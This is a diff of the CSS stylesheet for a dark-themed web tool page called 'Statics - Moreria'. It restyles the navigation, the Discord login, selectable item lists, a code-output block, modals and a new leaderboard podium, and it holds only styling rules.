@@ -3,616 +3,492 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>STATICS HUB — MORERIA</title>
+<title>32e4 / Statics - Moreria</title>
 <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Share+Tech+Mono&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
 <style>
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
   :root {
-    --bg: #000000;
-    --surface: #000000;
-    --panel: #000000;
-    --border: #1a1a1a;
-    --border-strong: #2a2a2a;
-    --text: #f0f0f0;
-    --muted: #777777;
-    --muted-light: #999999;
-    --accent: #ffffff;
-    --accent-soft: rgba(255,255,255,0.06);
-    --danger: #ff6b7a;
-    --green: #4ade80;
+    --bg: #09090b;
+    --surface: #121215;
+    --panel: #161619;
+    --border: #27272a;
+    --border-strong: #3f3f46;
+    --text: #fafafa;
+    --muted: #a1a1aa;
+    --muted-light: #d4d4d8;
+    --accent: #f97316;
+    --danger: #ef4444;
+    --green: #22c55e;
     --discord: #5865f2;
-    --glow: 0 0 30px rgba(255,255,255,0.06);
   }
-  html { background: var(--bg); }
+  
   body {
     background: var(--bg);
     color: var(--text);
     font-family: 'DM Sans', sans-serif;
     min-height: 100vh;
-    overflow-x: hidden;
-    position: relative;
-  }
-  body::before {
-    content: '';
-    position: fixed;
-    inset: 0;
-    background-image:
-      linear-gradient(rgba(255,255,255,0.012) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(255,255,255,0.012) 1px, transparent 1px);
-    background-size: 60px 60px;
-    pointer-events: none;
-    z-index: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
   }
 
-  /* ── TOP BAR ── */
-  .top-bar {
-    position: fixed;
-    top: 0; left: 0; right: 0;
-    height: 60px;
-    background: rgba(0,0,0,0.94);
-    border-bottom: 1px solid var(--border);
+  /* ── TOP NAVIGATION ── */
+  .top-nav {
+    width: 100%;
+    max-width: 1200px;
+    padding: 1.5rem 2rem;
     display: flex;
-    align-items: center;
     justify-content: space-between;
-    padding: 0 1.5rem;
-    z-index: 500;
-    backdrop-filter: blur(16px);
-  }
-  .top-left {
-    display: flex;
     align-items: center;
-    gap: 1.8rem;
-    min-width: 0;
+    position: relative;
+    z-index: 100;
   }
   .brand {
     font-family: 'Space Grotesk', sans-serif;
-    font-size: 0.82rem;
+    font-size: 1.1rem;
     font-weight: 700;
-    letter-spacing: 0.14em;
+    letter-spacing: 0.05em;
     color: var(--text);
-    white-space: nowrap;
   }
   .brand em {
     font-style: normal;
     color: var(--muted);
     font-weight: 500;
-    font-size: 0.62rem;
-    letter-spacing: 0.1em;
-    margin-left: 0.3rem;
+    font-size: 0.85rem;
   }
-  .counter {
+  
+  .nav-pill {
+    display: flex;
+    background: rgba(18, 18, 21, 0.8);
+    border: 1px solid var(--border);
+    border-radius: 99px;
+    padding: 0.3rem;
+    backdrop-filter: blur(10px);
+    box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+  }
+  .nav-item {
     display: flex;
     align-items: center;
-    gap: 0.45rem;
-    padding-left: 1.8rem;
-    border-left: 1px solid var(--border);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.62rem;
-    text-transform: uppercase;
-    letter-spacing: 0.08em;
+    gap: 0.5rem;
+    padding: 0.6rem 1.2rem;
+    background: transparent;
+    border: none;
+    border-radius: 99px;
     color: var(--muted);
-  }
-  .counter-num {
+    font-family: 'DM Sans', sans-serif;
     font-size: 0.85rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .nav-item:hover { color: var(--text); }
+  .nav-item.active {
+    background: #27272a;
     color: var(--text);
-    font-weight: 700;
   }
-  .counter-dot {
-    width: 5px; height: 5px;
-    border-radius: 50%;
-    background: var(--green);
-    animation: pulse 2s infinite;
-  }
-  @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.25; } }
+  .nav-item.active svg { color: var(--accent); }
+  .nav-item svg { width: 16px; height: 16px; fill: currentColor; }
 
-  .login-area { display: flex; align-items: center; gap: 0.6rem; }
+  /* ── USER CHIP ── */
+  .user-area { display: flex; align-items: center; gap: 1rem; }
+  .user-chip {
+    display: none; align-items: center; gap: 0.6rem;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 99px;
+    padding: 0.25rem 0.8rem 0.25rem 0.25rem;
+    cursor: pointer;
+    transition: border-color 0.2s;
+  }
+  .user-chip.show { display: flex; }
+  .user-chip:hover { border-color: var(--border-strong); }
+  .user-avatar {
+    width: 26px; height: 26px; border-radius: 50%;
+    object-fit: cover; border: 1px solid var(--border);
+  }
+  .user-name {
+    font-family: 'DM Sans', sans-serif;
+    font-size: 0.8rem; font-weight: 600;
+  }
   .btn-discord {
-    display: flex; align-items: center; gap: 0.45rem;
-    padding: 0.4rem 0.85rem;
+    display: flex; align-items: center; gap: 0.5rem;
+    padding: 0.5rem 1rem;
     background: var(--discord);
-    border: none; border-radius: 6px;
+    border: none; border-radius: 8px;
     color: #fff;
     font-family: 'DM Sans', sans-serif;
-    font-size: 0.7rem; font-weight: 600;
+    font-size: 0.8rem; font-weight: 600;
     cursor: pointer; transition: all 0.2s;
   }
   .btn-discord:hover { background: #4752c4; transform: translateY(-1px); }
-  .btn-discord:disabled { opacity: 0.6; cursor: wait; transform: none; }
-  .btn-discord svg { width: 14px; height: 14px; }
-  .user-chip {
-    display: none; align-items: center; gap: 0.5rem;
-    background: var(--panel);
-    border: 1px solid var(--border);
-    border-radius: 6px;
-    padding: 0.25rem 0.6rem;
-  }
-  .user-chip.show { display: flex; }
-  .user-avatar {
-    width: 24px; height: 24px; border-radius: 50%;
-    object-fit: cover; border: 1px solid var(--border-strong);
-  }
-  .user-name {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.65rem;
-    color: var(--text);
-  }
-  .role-badge {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.55rem; padding: 1px 5px; border-radius: 3px;
-    text-transform: uppercase; letter-spacing: 0.04em; font-weight: 700;
-  }
-  .btn-logout {
-    padding: 0.25rem 0.5rem;
-    background: transparent;
-    border: 1px solid var(--border-strong);
-    border-radius: 4px;
-    color: var(--muted-light);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.58rem; text-transform: uppercase;
-    cursor: pointer; transition: all 0.2s;
-  }
-  .btn-logout:hover { border-color: var(--danger); color: var(--danger); }
-  .btn-admin {
-    padding: 0.25rem 0.55rem;
-    background: transparent;
-    border: 1px solid var(--border-strong);
-    border-radius: 4px;
-    color: var(--muted-light);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.58rem; text-transform: uppercase;
-    cursor: pointer; transition: all 0.2s;
-    display: none;
-  }
-  .btn-admin:hover { border-color: var(--text); color: var(--text); }
-  .btn-admin.show { display: block; }
+  .btn-discord svg { width: 16px; height: 16px; }
 
-  /* ── MODALS ── */
-  .modal-overlay {
-    position: fixed; inset: 0;
-    background: rgba(0,0,0,0.92);
-    display: flex; align-items: center; justify-content: center;
-    z-index: 2000;
-    backdrop-filter: blur(8px);
-  }
-  .modal-overlay.hidden { display: none; }
-  .modal-box {
-    background: var(--panel);
-    border: 1px solid var(--border-strong);
-    border-radius: 12px;
-    padding: 2rem;
-    max-width: 420px; width: 90%;
-    text-align: center;
-    box-shadow: 0 40px 100px rgba(0,0,0,0.7);
-    animation: fadeUp 0.25s ease both;
-  }
-  @keyframes fadeUp { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: none; } }
-  .modal-box h2 {
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: 1.3rem; font-weight: 700;
-    color: var(--text); margin-bottom: 0.5rem;
-  }
-  .modal-box p {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.72rem; color: var(--muted);
-    line-height: 1.7; margin-bottom: 1.2rem;
-  }
-  .eyebrow {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.58rem; color: var(--muted);
-    letter-spacing: 0.18em; text-transform: uppercase;
-    margin-bottom: 0.7rem;
-  }
-  .auth-status {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.6rem; letter-spacing: 0.1em;
-    padding: 0.6rem;
-    border-radius: 6px;
-    margin-bottom: 1rem;
-    color: var(--muted);
-    background: var(--surface);
-    border: 1px solid var(--border);
-  }
-  .auth-status[data-state="error"] { color: var(--danger); border-color: rgba(255,107,122,0.25); }
-  .auth-status[data-state="loading"] { color: var(--muted-light); }
-  .auth-note { font-size: 0.62rem; margin-top: 0.8rem; }
-
-  /* ── ADMIN ── */
-  .admin-box {
-    background: var(--panel);
-    border: 1px solid var(--border-strong);
-    border-radius: 12px;
-    width: 92%; max-width: 620px;
-    max-height: 82vh;
-    display: flex; flex-direction: column;
-    overflow: hidden;
-    box-shadow: 0 40px 100px rgba(0,0,0,0.7);
-    animation: fadeUp 0.25s ease both;
-  }
-  .admin-head {
-    display: flex; align-items: center; justify-content: space-between;
-    padding: 1rem 1.2rem;
-    border-bottom: 1px solid var(--border);
-  }
-  .admin-head h2 {
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: 0.9rem; font-weight: 700; letter-spacing: 0.06em; text-transform: uppercase;
-  }
-  .admin-close {
-    width: 26px; height: 26px;
-    display: flex; align-items: center; justify-content: center;
-    background: transparent; border: 1px solid var(--border);
-    border-radius: 4px; color: var(--muted);
-    cursor: pointer; font-size: 0.8rem;
-    transition: all 0.2s;
-  }
-  .admin-close:hover { border-color: var(--text); color: var(--text); }
-  .admin-tabs { display: flex; border-bottom: 1px solid var(--border); }
-  .admin-tab {
-    flex: 1; padding: 0.65rem;
-    font-family: 'DM Sans', sans-serif;
-    font-size: 0.68rem; font-weight: 600;
-    text-transform: uppercase; letter-spacing: 0.06em;
-    color: var(--muted); background: none; border: none;
-    cursor: pointer; transition: all 0.2s;
-  }
-  .admin-tab.active { color: var(--text); border-bottom: 2px solid var(--text); }
-  .admin-body { flex: 1; overflow-y: auto; padding: 1rem; }
-  .pane { display: none; }
-  .pane.active { display: block; }
-
-  /* ── MAIN ── */
+  /* ── MAIN CONTAINER ── */
   .container {
-    max-width: 1000px;
-    margin: 0 auto;
-    padding: 130px 1.5rem 4rem;
-    position: relative; z-index: 1;
+    width: 100%;
+    max-width: 900px;
+    padding: 2rem;
+    display: none;
+    animation: fadeUp 0.3s ease both;
   }
-  .page-eyebrow {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.58rem; color: var(--muted);
-    letter-spacing: 0.22em; text-transform: uppercase;
-    margin-bottom: 1rem;
-  }
-  .page-title {
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: clamp(3rem, 9vw, 7rem);
-    font-weight: 700;
-    line-height: 0.86;
-    letter-spacing: -0.06em;
-    color: var(--text);
-    margin-bottom: 0.2rem;
-  }
-  .page-title-sub {
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: clamp(2rem, 6vw, 4.5rem);
-    font-weight: 500;
-    line-height: 0.95;
-    letter-spacing: -0.05em;
-    color: var(--muted);
-    margin-bottom: 1.5rem;
-  }
-  .page-desc {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.65rem; color: var(--muted);
-    letter-spacing: 0.12em; line-height: 1.8;
-    margin-bottom: 3rem;
-  }
+  .container.active { display: block; }
+  @keyframes fadeUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: none; } }
 
-  /* ── TOOL SECTIONS ── */
-  .tool-header { margin-bottom: 2rem; }
-  .tool-header h1 {
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: clamp(1.8rem, 4vw, 2.6rem);
-    font-weight: 700; letter-spacing: -0.04em;
-    text-transform: uppercase;
-  }
-  .tool-header .tagline {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.62rem; color: var(--muted);
-    letter-spacing: 0.14em; text-transform: uppercase;
-    margin-top: 0.2rem;
-  }
-
+  /* ── PANELS ── */
   .panel {
     background: var(--panel);
     border: 1px solid var(--border);
-    border-radius: 8px;
-    margin-bottom: 1rem;
+    border-radius: 12px;
+    margin-bottom: 1.5rem;
     overflow: hidden;
-    animation: fadeUp 0.4s ease both;
+    box-shadow: 0 8px 30px rgba(0,0,0,0.4);
   }
-  .panel:nth-child(1) { animation-delay: 0.04s; }
-  .panel:nth-child(2) { animation-delay: 0.1s; }
-  .panel:nth-child(3) { animation-delay: 0.16s; }
-
   .panel-head {
-    display: flex; align-items: center; gap: 0.5rem;
-    padding: 0.65rem 1.2rem;
-    background: var(--surface);
+    display: flex; align-items: center; gap: 0.6rem;
+    padding: 1rem 1.5rem;
     border-bottom: 1px solid var(--border);
+    background: var(--surface);
   }
   .dot {
-    width: 5px; height: 5px; border-radius: 50%;
-    background: var(--muted); flex-shrink: 0;
+    width: 6px; height: 6px; border-radius: 50%;
+    background: var(--border-strong); flex-shrink: 0;
   }
-  .dot.active { background: var(--green); }
+  .dot.active { background: var(--accent); box-shadow: 0 0 10px var(--accent); }
   .panel-title {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.62rem; text-transform: uppercase;
-    letter-spacing: 0.12em; color: var(--muted-light);
+    font-family: 'DM Sans', sans-serif;
+    font-size: 0.85rem; font-weight: 600;
+    color: var(--text);
   }
-  .panel-body { padding: 1.2rem; }
+  .panel-body { padding: 1.5rem; }
 
+  /* ── FORMS ── */
   .lbl {
     display: block;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.58rem; text-transform: uppercase;
-    letter-spacing: 0.1em; color: var(--muted);
-    margin-bottom: 0.35rem;
+    font-family: 'DM Sans', sans-serif;
+    font-size: 0.75rem; font-weight: 600;
+    color: var(--muted-light);
+    margin-bottom: 0.5rem;
   }
-  .input {
+  .input, .search-input {
     width: 100%;
     background: var(--bg);
     border: 1px solid var(--border);
-    border-radius: 6px;
-    padding: 0.55rem 0.8rem;
+    border-radius: 8px;
+    padding: 0.75rem 1rem;
     color: var(--text);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.78rem;
+    font-family: 'DM Sans', sans-serif;
+    font-size: 0.9rem;
     outline: none;
     transition: border-color 0.2s;
   }
-  .input:focus { border-color: var(--border-strong); }
-  .input::placeholder { color: var(--muted); }
+  .input:focus, .search-input:focus { border-color: var(--border-strong); }
+  .input::placeholder { color: var(--border-strong); }
   .hint {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.58rem; color: var(--muted);
-    margin-top: 0.3rem;
+    font-size: 0.75rem; color: var(--muted);
+    margin-top: 0.5rem;
   }
   .hint.error { color: var(--danger); }
 
-  .search-row { display: flex; gap: 0.5rem; margin-bottom: 0.6rem; }
-  .search-input {
-    flex: 1;
-    background: var(--bg);
-    border: 1px solid var(--border);
-    border-radius: 6px;
-    padding: 0.5rem 0.75rem;
-    color: var(--text);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.75rem;
-    outline: none;
-  }
-  .search-input:focus { border-color: var(--border-strong); }
+  .search-row { display: flex; gap: 0.5rem; margin-bottom: 1rem; }
   .btn-sm {
-    padding: 0.45rem 0.75rem;
-    background: transparent;
-    border: 1px solid var(--border-strong);
-    border-radius: 6px;
+    padding: 0.5rem 1rem;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
     color: var(--muted-light);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.6rem; text-transform: uppercase;
+    font-family: 'DM Sans', sans-serif;
+    font-size: 0.75rem; font-weight: 600;
     cursor: pointer; transition: all 0.2s;
-    white-space: nowrap;
   }
-  .btn-sm:hover { border-color: var(--text); color: var(--text); }
-  .btn-sm.danger { color: var(--danger); border-color: rgba(255,107,122,0.3); }
-  .btn-sm.danger:hover { border-color: var(--danger); }
+  .btn-sm:hover { background: var(--border); color: var(--text); }
+  .btn-sm.danger { color: var(--danger); }
+  .btn-sm.danger:hover { background: rgba(239, 68, 68, 0.1); border-color: rgba(239, 68, 68, 0.2); }
 
-  .animal-list {
+  /* ── LISTS ── */
+  .item-list {
     background: var(--bg);
     border: 1px solid var(--border);
-    border-radius: 6px;
-    height: 220px;
+    border-radius: 8px;
+    height: 240px;
     overflow-y: auto;
     scrollbar-width: thin;
     scrollbar-color: var(--border-strong) transparent;
   }
-  .animal-list::-webkit-scrollbar { width: 3px; }
-  .animal-list::-webkit-scrollbar-thumb { background: var(--border-strong); border-radius: 3px; }
+  .item-list::-webkit-scrollbar { width: 6px; }
+  .item-list::-webkit-scrollbar-thumb { background: var(--border-strong); border-radius: 6px; }
   .a-item {
-    display: flex; align-items: center; gap: 0.6rem;
-    padding: 0.4rem 0.8rem;
-    border-bottom: 1px solid rgba(255,255,255,0.02);
+    display: flex; align-items: center; gap: 0.8rem;
+    padding: 0.6rem 1rem;
+    border-bottom: 1px solid var(--border);
     cursor: pointer; transition: background 0.1s;
     user-select: none;
   }
   .a-item:last-child { border-bottom: none; }
-  .a-item:hover { background: rgba(255,255,255,0.025); }
-  .a-item.on { background: rgba(255,255,255,0.045); }
+  .a-item:hover { background: rgba(255,255,255,0.03); }
+  .a-item.on { background: rgba(249, 115, 22, 0.08); }
   .a-item input[type="checkbox"] {
     -webkit-appearance: none; appearance: none;
-    width: 12px; height: 12px;
+    width: 16px; height: 16px;
     border: 1px solid var(--border-strong);
-    border-radius: 2px;
+    border-radius: 4px;
     background: transparent; cursor: pointer;
     flex-shrink: 0; position: relative;
     transition: all 0.15s;
   }
   .a-item input[type="checkbox"]:checked {
-    background: var(--text); border-color: var(--text);
+    background: var(--accent); border-color: var(--accent);
   }
   .a-item input[type="checkbox"]:checked::after {
     content: '✓'; position: absolute;
-    color: var(--bg); font-size: 8px; font-weight: 900;
+    color: #fff; font-size: 10px; font-weight: 900;
     top: 50%; left: 50%; transform: translate(-50%,-55%);
   }
-  .a-name { font-size: 0.8rem; flex: 1; color: var(--text); }
+  .a-name { font-size: 0.85rem; flex: 1; color: var(--text); font-weight: 500; }
   .badge {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.5rem; text-transform: uppercase;
-    letter-spacing: 0.06em; padding: 1px 5px;
-    border-radius: 3px; border: 1px solid var(--border-strong);
+    font-size: 0.65rem; font-weight: 600;
+    padding: 2px 6px; border-radius: 4px;
+    background: var(--surface); border: 1px solid var(--border);
     color: var(--muted);
   }
   .a-mps {
     font-family: 'Share Tech Mono', monospace;
-    font-size: 0.55rem; color: var(--muted);
+    font-size: 0.7rem; color: var(--muted);
     min-width: 70px; text-align: right;
   }
-  .meta-row { display: flex; justify-content: space-between; margin-top: 0.5rem; }
-  .sel-count {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.58rem; color: var(--muted);
-  }
-  .sel-count span { color: var(--text); }
+  .meta-row { display: flex; justify-content: space-between; margin-top: 0.8rem; }
+  .sel-count { font-size: 0.75rem; color: var(--muted); font-weight: 500; }
+  .sel-count span { color: var(--accent); }
 
-  /* ── BASES PANEL (blue theme) ── */
-  .panel.bases-panel {
-    border-color: #1a3a5c;
-  }
-  .panel.bases-panel .panel-head {
-    background: #061422;
-    border-bottom-color: #1a3a5c;
-  }
-  .panel.bases-panel .dot.active { background: #4aa8ff; }
-  .panel.bases-panel .panel-title { color: #8ec4ff; }
-  .panel.bases-panel .search-input,
-  .panel.bases-panel .animal-list {
-    border-color: #1a3a5c;
-  }
-  .panel.bases-panel .search-input:focus { border-color: #2e6fa8; }
-  .panel.bases-panel .btn-sm { border-color: #1a3a5c; color: #6aa8e0; }
-  .panel.bases-panel .btn-sm:hover { border-color: #4aa8ff; color: #8ec4ff; }
-  .panel.bases-panel .btn-sm.danger { color: #ff6b7a; border-color: rgba(255,107,122,0.3); }
-  .panel.bases-panel .a-item:hover { background: rgba(74,168,255,0.04); }
-  .panel.bases-panel .a-item.on { background: rgba(74,168,255,0.08); }
-  .panel.bases-panel .a-item input[type="checkbox"]:checked {
-    background: #4aa8ff; border-color: #4aa8ff;
-  }
-  .panel.bases-panel .a-item input[type="checkbox"]:checked::after {
-    color: #04101c;
-  }
-  .panel.bases-panel .a-name { color: #d0e8ff; }
-  .panel.bases-panel .badge { border-color: #1a3a5c; color: #6aa8e0; }
-  .panel.bases-panel .sel-count span { color: #8ec4ff; }
-  .panel.bases-panel .lbl { color: #6aa8e0; }
-  .panel.bases-panel .input { border-color: #1a3a5c; }
-  .panel.bases-panel .input:focus { border-color: #2e6fa8; }
-
+  /* ── BUTTONS ── */
   .btn-gen {
     display: block; width: 100%;
-    padding: 0.85rem;
+    padding: 1rem;
     background: var(--text);
-    border: none; border-radius: 8px;
+    border: none; border-radius: 10px;
     color: var(--bg);
     font-family: 'Space Grotesk', sans-serif;
-    font-size: 0.95rem; font-weight: 700;
-    letter-spacing: 0.1em; text-transform: uppercase;
+    font-size: 1rem; font-weight: 700;
+    letter-spacing: 0.05em; text-transform: uppercase;
     cursor: pointer; transition: all 0.2s;
-    margin-bottom: 1rem;
+    margin-bottom: 1.5rem;
+    box-shadow: 0 4px 15px rgba(255,255,255,0.1);
   }
-  .btn-gen:hover { background: #d0d0d0; transform: translateY(-1px); }
-  .btn-gen:disabled { opacity: 0.4; cursor: wait; transform: none; }
+  .btn-gen:hover { background: #d4d4d8; transform: translateY(-2px); box-shadow: 0 6px 20px rgba(255,255,255,0.15); }
+  .btn-gen:disabled { opacity: 0.5; cursor: wait; transform: none; box-shadow: none; }
 
   .out-head {
-    display: flex; align-items: center; gap: 0.5rem;
-    padding: 0.65rem 1.2rem;
+    display: flex; align-items: center; gap: 0.6rem;
+    padding: 1rem 1.5rem;
     background: var(--surface);
     border-bottom: 1px solid var(--border);
   }
   .btn-copy {
     margin-left: auto;
-    padding: 0.25rem 0.6rem;
-    background: transparent;
-    border: 1px solid var(--border-strong);
-    border-radius: 4px;
+    padding: 0.4rem 0.8rem;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 6px;
     color: var(--muted-light);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.58rem; text-transform: uppercase;
+    font-family: 'DM Sans', sans-serif;
+    font-size: 0.75rem; font-weight: 600;
     cursor: pointer; transition: all 0.2s;
   }
-  .btn-copy:hover { border-color: var(--text); color: var(--text); }
+  .btn-copy:hover { border-color: var(--border-strong); color: var(--text); }
   .btn-copy.ok { border-color: var(--green); color: var(--green); }
   .code-block {
     background: var(--bg);
     border: 1px solid var(--border);
-    border-radius: 6px;
-    padding: 0.9rem 1rem;
+    border-radius: 8px;
+    padding: 1rem;
     font-family: 'Share Tech Mono', monospace;
-    font-size: 0.7rem; line-height: 1.7;
+    font-size: 0.75rem; line-height: 1.6;
     color: var(--muted-light);
-    min-height: 100px; max-height: 400px;
+    min-height: 120px; max-height: 400px;
     overflow: auto; white-space: pre; overflow-x: auto;
     scrollbar-width: thin; scrollbar-color: var(--border-strong) transparent;
   }
   .code-block.empty { color: var(--muted); font-style: italic; white-space: pre-wrap; }
 
+  /* ── LEADERBOARD ── */
+  .lb-header {
+    text-align: center;
+    margin-bottom: 3rem;
+  }
+  .lb-header h1 {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 2.5rem; font-weight: 700;
+    margin-bottom: 0.5rem;
+    display: flex; align-items: center; justify-content: center; gap: 1rem;
+  }
+  .lb-header h1 svg { width: 32px; height: 32px; color: var(--accent); }
+  .lb-header p { color: var(--muted); font-size: 0.95rem; }
+
+  .podium-grid {
+    display: flex;
+    justify-content: center;
+    align-items: flex-end;
+    gap: 1.5rem;
+    margin-bottom: 3rem;
+    padding-top: 2rem;
+  }
+  .podium-card {
+    display: flex; flex-direction: column; align-items: center;
+    width: 200px;
+  }
+  .podium-avatar-wrap {
+    position: relative; margin-bottom: 1rem;
+  }
+  .podium-avatar {
+    width: 80px; height: 80px; border-radius: 50%;
+    object-fit: cover; border: 3px solid var(--border);
+  }
+  .podium-card.first .podium-avatar { width: 100px; height: 100px; border-color: #eab308; }
+  .podium-card.second .podium-avatar { border-color: #94a3b8; }
+  .podium-card.third .podium-avatar { border-color: #b45309; }
+  
+  .podium-badge {
+    position: absolute; top: -15px; left: 50%; transform: translateX(-50%);
+    font-size: 1.5rem;
+  }
+  .podium-name { font-weight: 700; font-size: 1rem; color: var(--text); }
+  .podium-handle { font-size: 0.75rem; color: var(--muted); margin-bottom: 1rem; }
+  
+  .podium-pillar {
+    width: 100%;
+    border-radius: 12px 12px 0 0;
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    padding: 1.5rem 0;
+    border: 1px solid var(--border); border-bottom: none;
+  }
+  .podium-card.first .podium-pillar { height: 180px; background: rgba(234, 179, 8, 0.1); border-color: rgba(234, 179, 8, 0.3); }
+  .podium-card.second .podium-pillar { height: 140px; background: rgba(148, 163, 184, 0.1); border-color: rgba(148, 163, 184, 0.3); }
+  .podium-card.third .podium-pillar { height: 110px; background: rgba(180, 83, 9, 0.1); border-color: rgba(180, 83, 9, 0.3); }
+  
+  .podium-logs { font-size: 1.8rem; font-weight: 700; font-family: 'Space Grotesk', sans-serif; }
+  .podium-logs-lbl { font-size: 0.75rem; color: var(--muted); text-transform: uppercase; letter-spacing: 0.1em; }
+
+  .lb-list {
+    background: var(--panel); border: 1px solid var(--border); border-radius: 12px;
+    overflow: hidden;
+  }
+  .lb-list-head {
+    padding: 1rem 1.5rem; border-bottom: 1px solid var(--border);
+    font-size: 0.85rem; font-weight: 600; color: var(--muted-light);
+    display: flex; align-items: center; gap: 0.5rem;
+  }
+  .lb-row {
+    display: flex; align-items: center; gap: 1rem;
+    padding: 1rem 1.5rem;
+    border-bottom: 1px solid var(--border);
+  }
+  .lb-row:last-child { border-bottom: none; }
+  .lb-rank { font-family: 'Share Tech Mono', monospace; font-size: 0.9rem; color: var(--muted); width: 24px; }
+  .lb-avatar { width: 36px; height: 36px; border-radius: 8px; object-fit: cover; }
+  .lb-info { flex: 1; }
+  .lb-name { font-size: 0.9rem; font-weight: 600; color: var(--text); }
+  .lb-handle { font-size: 0.75rem; color: var(--muted); }
+  .lb-score { text-align: right; }
+  .lb-score-num { font-size: 1.1rem; font-weight: 700; font-family: 'Space Grotesk', sans-serif; }
+  .lb-score-lbl { font-size: 0.65rem; color: var(--muted); text-transform: uppercase; }
+
+  /* ── LOGIN & MODALS ── */
+  .modal-overlay {
+    position: fixed; inset: 0;
+    background: rgba(0,0,0,0.8);
+    display: flex; align-items: center; justify-content: center;
+    z-index: 1000;
+    backdrop-filter: blur(8px);
+  }
+  .modal-overlay.hidden { display: none; }
+  .modal-box {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 2.5rem;
+    max-width: 400px; width: 90%;
+    text-align: center;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+    animation: fadeUp 0.3s ease both;
+  }
+  .modal-box h2 {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 1.5rem; font-weight: 700;
+    color: var(--text); margin-bottom: 0.5rem;
+  }
+  .modal-box p {
+    font-size: 0.85rem; color: var(--muted);
+    line-height: 1.6; margin-bottom: 1.5rem;
+  }
+  .auth-status {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.75rem; letter-spacing: 0.1em;
+    padding: 0.8rem; border-radius: 8px;
+    margin-bottom: 1.5rem;
+    color: var(--muted); background: var(--bg);
+    border: 1px solid var(--border);
+  }
+  .auth-status[data-state="error"] { color: var(--danger); border-color: rgba(239,68,68,0.3); }
+
   /* ── TOAST ── */
   .toast {
-    position: fixed; bottom: 1.5rem; left: 50%;
+    position: fixed; bottom: 2rem; left: 50%;
     transform: translateX(-50%) translateY(60px);
     background: var(--panel);
-    border: 1px solid var(--border-strong);
+    border: 1px solid var(--border);
     border-radius: 8px;
-    padding: 0.65rem 1.2rem;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.65rem; color: var(--text);
-    z-index: 999; opacity: 0;
-    transition: all 0.3s ease;
-    white-space: nowrap;
-    box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+    padding: 0.8rem 1.5rem;
+    font-size: 0.85rem; font-weight: 600; color: var(--text);
+    z-index: 2000; opacity: 0;
+    transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+    box-shadow: 0 10px 30px rgba(0,0,0,0.6);
   }
   .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
-  .toast.success { border-color: rgba(74,222,128,0.4); color: var(--green); }
-  .toast.error { border-color: rgba(255,107,122,0.4); color: var(--danger); }
-
-  /* ── SUGGESTIONS ── */
-  .suggestions {
-    position: absolute; bottom: 100%; left: 0; right: 0;
-    background: var(--panel);
-    border: 1px solid var(--border-strong);
-    border-radius: 6px;
-    max-height: 180px; overflow-y: auto;
-    z-index: 100;
-  }
-  .sug-item {
-    padding: 8px 10px; cursor: pointer;
-    display: flex; align-items: center; gap: 8px;
-    border-bottom: 1px solid rgba(255,255,255,0.03);
-    transition: background 0.1s;
-  }
-  .sug-item:hover { background: rgba(255,255,255,0.04); }
-  .sug-avatar {
-    width: 28px; height: 28px; border-radius: 50%;
-    overflow: hidden; background: var(--surface);
-  }
-  .sug-avatar img { width: 100%; height: 100%; object-fit: cover; }
-  .sug-name { font-size: 0.78rem; font-weight: 600; }
-  .sug-handle { font-size: 0.65rem; color: var(--muted); }
-
-  /* ── RESPONSIVE ── */
-  @media (max-width: 640px) {
-    .top-bar { padding: 0 0.8rem; }
-    .brand em { display: none; }
-    .counter { padding-left: 0.8rem; }
-    .counter span:not(.counter-num) { display: none; }
-    .container { padding: 100px 1rem 3rem; }
-    .page-title { font-size: clamp(2.6rem, 16vw, 4.5rem); }
-    .page-title-sub { font-size: clamp(1.8rem, 10vw, 3rem); }
-    .user-name { display: none; }
-  }
+  .toast.success { border-color: var(--green); }
